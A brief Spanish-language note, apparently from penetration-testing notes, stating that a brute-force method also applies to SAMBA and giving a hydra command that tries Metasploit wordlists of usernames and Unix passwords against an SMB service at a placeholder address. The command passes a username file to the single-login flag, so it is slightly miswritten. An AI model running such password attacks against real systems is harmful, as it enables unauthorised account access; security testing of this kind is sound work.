Este método de fuerza bruta vale también para SAMBA, la implementación de SMB en Linux.
# Command
`hydra -l /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords <ip> -t 1 smb`
